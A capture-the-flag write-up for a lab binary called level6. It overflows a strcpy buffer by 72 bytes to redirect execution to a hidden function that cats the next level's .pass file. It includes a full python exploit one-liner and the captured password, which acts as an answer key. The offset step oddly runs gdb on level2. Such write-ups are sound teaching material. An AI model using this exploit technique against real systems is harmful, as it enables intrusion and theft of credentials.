We started by running the program without any arguments and encountered a segmentation fault:
```
$ ./level6
Segmentation fault (core dumped)
```
Next, we ran the program with a test argument, which resulted in a standard response:
```
$ ./level6 Heloooo
Nope
```
We ran the program a 3rd time r with a longer argument, which again resulted in a segmentation fault:
```
$ ./level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
Disassembling the `main` function revealed a call to `strcpy` with the provided argument. The `strcpy` function is notorious for being vulnerable to buffer overflow attacks due to its lack of bounds checking.

From the `strcpy` man page:
>The strcpy() function is easily misused in a manner which enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack.

 Additionally, we discovered an unused function called `n()`:
 ```
 (gdb) info functions
[...]
0x08048454  n
0x08048468  m
0x0804847c  main
[...]
```
Upon disassembling the `n()` function, we found that it calls the `system` function with the argument "/bin/cat /home/user/level7/.pass":
```
0x08048454 <+0>:    call   0x80483b0 <system@plt>
```
This gives us a clear path to exploit the program by redirecting the program flow to the `n()` function.

We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
```
$ gdb ./level2 
(gdb) run
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```
We find that the buffer size is 72

We crafted the payload to overflow the buffer and overwrite the return address with the address of the `n()` function (`0x08048454`), using little-endian format. The payload consists of 72 'A' characters followed by the address of `n()`.
```
$ ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
